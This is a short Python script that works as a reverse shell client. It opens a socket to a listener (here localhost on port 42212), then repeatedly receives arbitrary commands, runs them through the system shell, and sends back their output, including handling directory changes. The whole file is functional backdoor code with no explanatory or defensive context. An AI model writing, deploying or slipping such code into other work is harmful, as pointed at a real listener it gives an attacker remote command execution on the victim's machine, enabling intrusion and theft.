import socket
import subprocess
import os

s = socket.socket()

s.connect(("localhost", 42212))

print(s.recv(25).decode())
s.send("hello".encode())


while True:
	s.recv(2)
	s.send(subprocess.Popen("pwd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).stdout.read())

	cmd = s.recv(10240).decode()

	if cmd.startswith("cd "):
		os.chdir(cmd.replace("cd ", ""))
		output = "changed"
	else:
		output = " \n"
		output_raw = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
		output = output_raw.stderr.read().decode()
		output = output + output_raw.stdout.read().decode()

	s.send(output.encode())
